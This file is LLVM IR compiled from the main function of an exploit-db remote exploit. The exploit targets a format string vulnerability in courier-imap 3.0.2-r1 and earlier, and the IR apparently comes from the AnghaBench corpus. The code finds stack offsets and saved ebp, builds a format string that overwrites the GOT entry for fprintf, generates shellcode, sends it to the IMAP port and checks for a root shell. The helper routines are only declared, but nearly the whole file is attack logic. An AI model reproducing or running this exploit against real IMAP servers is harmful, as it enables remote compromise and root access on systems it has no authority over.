; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/bsd/remote/extr_432.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/bsd/remote/extr_432.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [10 x i8] c"127.0.0.1\00", align 1
@IMAP_PORT = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [93 x i8] c"courier-imap <= 3.0.2-r1 Remote Format String Vulnerability exploit by ktha at hush dot com\0A\00", align 1
@.str.2 = private unnamed_addr constant [36 x i8] c"[*] Launching attack against %s:%d\0A\00", align 1
@TOP_STACK = common dso_local global i32 0, align 4
@DUMMY_NUMBER = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [29 x i8] c"[+] Got current ebp(%d): %p\0A\00", align 1
@.str.4 = private unnamed_addr constant [32 x i8] c"[-] Failed to get a saved_ebp !\00", align 1
@.str.5 = private unnamed_addr constant [36 x i8] c"[+] Got possible saved ebp(%d): %p\0A\00", align 1
@GAP_EBP_ESP = common dso_local global i64 0, align 8
@.str.6 = private unnamed_addr constant [53 x i8] c"[+] Got possible write on the stack pointer(%d): %p\0A\00", align 1
@.str.7 = private unnamed_addr constant [17 x i8] c"[+] Verifying...\00", align 1
@.str.8 = private unnamed_addr constant [4 x i8] c"OK\0A\00", align 1
@.str.9 = private unnamed_addr constant [8 x i8] c"failed\0A\00", align 1
@.str.10 = private unnamed_addr constant [20 x i8] c"[+] Building fmt...\00", align 1
@.str.11 = private unnamed_addr constant [6 x i8] c"done\0A\00", align 1
@.str.12 = private unnamed_addr constant [26 x i8] c"[+] Building shellcode...\00", align 1
@.str.13 = private unnamed_addr constant [19 x i8] c"[*] Using ret: %p\0A\00", align 1
@.str.14 = private unnamed_addr constant [32 x i8] c"[*] Using got of fprintf(): %p\0A\00", align 1
@.str.15 = private unnamed_addr constant [26 x i8] c"[*] Checking for shell..\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8*, align 8
  %10 = alloca i8*, align 8
  %11 = alloca i8*, align 8
  %12 = alloca i32*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i64, align 8
  %17 = alloca i32, align 4
  %18 = alloca i64, align 8
  %19 = alloca i32, align 4
  %20 = alloca i64, align 8
  %21 = alloca i32, align 4
  %22 = alloca i64, align 8
  %23 = alloca i32, align 4
  %24 = alloca i64, align 8
  %25 = alloca i64, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str, i64 0, i64 0), i8** %6, align 8
  %26 = load i32, i32* @IMAP_PORT, align 4
  store i32 %26, i32* %7, align 4
  store i32 0, i32* %17, align 4
  store i32 0, i32* %19, align 4
  store i32 0, i32* %21, align 4
  store i32 0, i32* %23, align 4
  store i64 134545148, i64* %24, align 8
  store i64 134574080, i64* %25, align 8
  %27 = load i32, i32* %4, align 4
  %28 = icmp sgt i32 %27, 1
  br i1 %28, label %29, label %33

29:                                               ; preds = %2
  %30 = load i8**, i8*** %5, align 8
  %31 = getelementptr inbounds i8*, i8** %30, i64 1
  %32 = load i8*, i8** %31, align 8
  store i8* %32, i8** %6, align 8
  br label %33

33:                                               ; preds = %29, %2
  %34 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([93 x i8], [93 x i8]* @.str.1, i64 0, i64 0))
  %35 = load i8*, i8** %6, align 8
  %36 = load i32, i32* %7, align 4
  %37 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.2, i64 0, i64 0), i8* %35, i32 %36)
  %38 = load i32, i32* %17, align 4
  %39 = icmp eq i32 %38, 0
  br i1 %39, label %40, label %44

40:                                               ; preds = %33
  %41 = load i8*, i8** %6, align 8
  %42 = load i32, i32* %7, align 4
  %43 = call i32 @get_ce_number(i8* %41, i32 %42)
  store i32 %43, i32* %17, align 4
  br label %44

44:                                               ; preds = %40, %33
  %45 = load i32, i32* @TOP_STACK, align 4
  %46 = load i32, i32* %17, align 4
  %47 = mul nsw i32 4, %46
  %48 = sub nsw i32 %45, %47
  %49 = sext i32 %48 to i64
  store i64 %49, i64* %16, align 8
  %50 = load i32, i32* @DUMMY_NUMBER, align 4
  store i32 %50, i32* %23, align 4
  %51 = load i64, i64* %16, align 8
  %52 = load i32, i32* %23, align 4
  %53 = sub nsw i32 %52, 1
  %54 = mul nsw i32 4, %53
  %55 = sext i32 %54 to i64
  %56 = add i64 %51, %55
  store i64 %56, i64* %22, align 8
  %57 = load i32, i32* %17, align 4
  %58 = load i64, i64* %16, align 8
  %59 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.3, i64 0, i64 0), i32 %57, i64 %58)
  br label %60

60:                                               ; preds = %108, %44
  %61 = load i32, i32* %19, align 4
  %62 = load i32, i32* %17, align 4
  %63 = load i8*, i8** %6, align 8
  %64 = load i32, i32* %7, align 4
  %65 = call i32 @get_se_number(i32 %61, i32 %62, i8* %63, i32 %64)
  store i32 %65, i32* %19, align 4
  %66 = load i32, i32* %19, align 4
  %67 = icmp eq i32 %66, -1
  br i1 %67, label %68, label %70

68:                                               ; preds = %60
  %69 = call i32 @die(i32 1, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.4, i64 0, i64 0))
  br label %70

70:                                               ; preds = %68, %60
  %71 = load i64, i64* %16, align 8
  %72 = load i32, i32* %19, align 4
  %73 = sub nsw i32 %72, 1
  %74 = mul nsw i32 4, %73
  %75 = sext i32 %74 to i64
  %76 = add i64 %71, %75
  store i64 %76, i64* %18, align 8
  %77 = load i32, i32* %19, align 4
  %78 = load i64, i64* %18, align 8
  %79 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.5, i64 0, i64 0), i32 %77, i64 %78)
  %80 = load i64, i64* @GAP_EBP_ESP, align 8
  %81 = load i64, i64* %18, align 8
  %82 = add i64 %80, %81
  store i64 %82, i64* %20, align 8
  %83 = load i64, i64* %20, align 8
  %84 = load i64, i64* %16, align 8
  %85 = sub i64 %83, %84
  %86 = udiv i64 %85, 4
  %87 = add i64 %86, 1
  %88 = trunc i64 %87 to i32
  store i32 %88, i32* %21, align 4
  %89 = load i32, i32* %21, align 4
  %90 = load i64, i64* %20, align 8
  %91 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([53 x i8], [53 x i8]* @.str.6, i64 0, i64 0), i32 %89, i64 %90)
  %92 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.7, i64 0, i64 0))
  %93 = load i32, i32* %21, align 4
  %94 = load i64, i64* %22, align 8
  %95 = load i32, i32* %19, align 4
  %96 = load i8*, i8** %6, align 8
  %97 = load i32, i32* %7, align 4
  %98 = call i32 @verify_se_number(i32 %93, i64 %94, i32 %95, i8* %96, i32 %97)
  store i32 %98, i32* %14, align 4
  %99 = load i32, i32* %14, align 4
  %100 = icmp ne i32 %99, 0
  br i1 %100, label %101, label %103

101:                                              ; preds = %70
  %102 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.8, i64 0, i64 0))
  br label %107

103:                                              ; preds = %70
  %104 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.9, i64 0, i64 0))
  %105 = load i32, i32* %19, align 4
  %106 = add nsw i32 %105, 1
  store i32 %106, i32* %19, align 4
  br label %107

107:                                              ; preds = %103, %101
  br label %108

108:                                              ; preds = %107
  %109 = load i32, i32* %14, align 4
  %110 = icmp ne i32 %109, 0
  %111 = xor i1 %110, true
  br i1 %111, label %60, label %112

112:                                              ; preds = %108
  %113 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.10, i64 0, i64 0))
  %114 = load i64, i64* %22, align 8
  %115 = load i64, i64* %24, align 8
  %116 = load i64, i64* %25, align 8
  %117 = call i32* @get_format_vector(i64 %114, i64 %115, i64 %116)
  store i32* %117, i32** %12, align 8
  %118 = load i32*, i32** %12, align 8
  %119 = load i32, i32* %19, align 4
  %120 = load i32, i32* %21, align 4
  %121 = load i32, i32* %23, align 4
  %122 = call i8* @get_format_string(i32* %118, i32 %119, i32 %120, i32 %121)
  store i8* %122, i8** %9, align 8
  %123 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.11, i64 0, i64 0))
  %124 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.12, i64 0, i64 0))
  %125 = call i8* @gen_shellcode(i32 800)
  store i8* %125, i8** %10, align 8
  %126 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.11, i64 0, i64 0))
  %127 = load i64, i64* %25, align 8
  %128 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.13, i64 0, i64 0), i64 %127)
  %129 = load i64, i64* %24, align 8
  %130 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.14, i64 0, i64 0), i64 %129)
  %131 = load i8*, i8** %9, align 8
  %132 = load i8*, i8** %10, align 8
  %133 = call i8* @get_request(i8* %131, i8* %132)
  store i8* %133, i8** %11, align 8
  %134 = load i8*, i8** %6, align 8
  %135 = load i32, i32* %7, align 4
  %136 = call i32 @connect_to(i8* %134, i32 %135)
  store i32 %136, i32* %8, align 4
  %137 = load i32, i32* %8, align 4
  %138 = load i8*, i8** %11, align 8
  %139 = call i32 @send_data(i32 %137, i8* %138)
  %140 = call i32 @sleep(i32 2)
  %141 = load i32, i32* %8, align 4
  %142 = call i32 @close_socket(i32 %141)
  %143 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.15, i64 0, i64 0))
  %144 = load i8*, i8** %6, align 8
  %145 = call i32 @root(i8* %144)
  %146 = load i32, i32* %3, align 4
  ret i32 %146
}

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @get_ce_number(i8*, i32) #1

declare dso_local i32 @get_se_number(i32, i32, i8*, i32) #1

declare dso_local i32 @die(i32, i8*) #1

declare dso_local i32 @verify_se_number(i32, i64, i32, i8*, i32) #1

declare dso_local i32* @get_format_vector(i64, i64, i64) #1

declare dso_local i8* @get_format_string(i32*, i32, i32, i32) #1

declare dso_local i8* @gen_shellcode(i32) #1

declare dso_local i8* @get_request(i8*, i8*) #1

declare dso_local i32 @connect_to(i8*, i32) #1

declare dso_local i32 @send_data(i32, i8*) #1

declare dso_local i32 @sleep(i32) #1

declare dso_local i32 @close_socket(i32) #1

declare dso_local i32 @root(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
